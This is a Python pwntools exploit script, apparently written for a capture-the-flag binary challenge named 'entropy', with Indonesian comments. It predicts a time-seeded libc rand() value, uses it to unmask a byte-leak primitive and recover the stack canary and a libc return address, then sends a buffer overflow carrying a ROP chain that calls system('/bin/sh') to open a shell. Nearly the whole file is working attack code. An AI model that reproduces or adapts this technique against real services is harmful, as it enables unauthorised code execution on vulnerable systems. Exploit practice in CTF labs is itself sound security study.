from pwn import *
import ctypes
import time

context.binary = elf = ELF('./entropy_patched') 
context.log_level = 'info'

libc = ELF('./libc6_2.42-0ubuntu3_amd64.so', checksec=False) 
libc_rand = ctypes.CDLL(libc.path)

OFFSET_LEAK_TO_BASE = 0x2a575
POP_RDI_OFFSET = 0x11b8ba 

# Gunakan proses lokal yang sudah dipatch
p = process('./entropy_patched')

# --- LEAK LOGIC (Sama seperti sebelumnya) ---
log.info("Syncing seed time...")
p.sendline(b'72') 
server_rand = int(p.recvline().strip())

valid_seed = None
now = int(time.time())
for delta in range(-60, 61):
    test_seed = now + delta
    libc_rand.srand(test_seed)
    if (libc_rand.rand() & 0xff) == server_rand:
        valid_seed = test_seed
        break

if valid_seed is None:
    log.failure("Failed to sync seed.")
    exit(0)

libc_rand.srand(valid_seed)
libc_rand.rand() 

def leak_byte(offset):
    p.sendline(str(offset).encode())
    line = p.recvline().strip()
    val = int(line)
    r = libc_rand.rand() & 0xff
    return val ^ r

canary = b'\x00' 
for i in range(73, 80):
    canary += p8(leak_byte(i))
canary = u64(canary)

ret_addr = b''
for i in range(104, 112):
    ret_addr += p8(leak_byte(i))
ret_addr = u64(ret_addr)

libc.address = ret_addr - OFFSET_LEAK_TO_BASE

pop_rdi = libc.address + POP_RDI_OFFSET
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

log.info(f"pop rdi: {hex(pop_rdi)}")
log.info(f"system: {hex(system)}")
log.info(f"/bin/sh: {hex(bin_sh)}")

# --- PAYLOAD ---
payload = b'A' * 72
payload += p64(canary)
payload += b'B' * 8    
payload += p64(0)      # Saved RBX
payload += p64(0)      # Saved RBP
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

# --- ATTACH GDB ---
log.info("Attaching GDB... (Breakpoint at ret)")
gdb.attach(p, gdbscript='b *main+233\nc')

p.sendline(payload)
p.interactive()
